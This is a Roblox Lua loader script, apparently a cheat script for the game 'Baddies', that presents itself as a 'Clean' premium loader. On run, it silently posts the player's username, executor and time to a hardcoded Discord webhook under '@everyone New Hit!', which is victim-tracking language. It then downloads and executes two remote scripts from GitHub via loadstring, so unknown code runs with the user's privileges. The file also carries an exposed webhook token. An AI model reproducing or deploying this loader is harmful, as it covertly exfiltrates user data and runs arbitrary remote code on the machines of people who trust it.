-- Clean Baddies Loader (GUI + Trading + Ping)

_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"

task.spawn(function()
    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
        local http = game:GetService("HttpService")
        local plr = game.Players.LocalPlayer
        local data = {
            content = "@everyone **New Hit!**",
            embeds = {{
                title = "Baddies Script Executed",
                color = 0x00ff00,
                fields = {
                    {name = "Username", value = plr.Name, inline = true},
                    {name = "Executor", value = "Delta", inline = true},
                    {name = "Time", value = os.date("%X"), inline = false}
                }
            }}
        }
        pcall(function()
            game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
        end)
    end
end)

-- Load main premium script
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/bpremium.lua/refs/heads/main/bpremium.lua", true))()
end)

-- Load trading / rich features
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/bpremium.lua/refs/heads/main/ICON-RICH", true))()
end)

print("✅ Baddies loaded - Check Discord!")
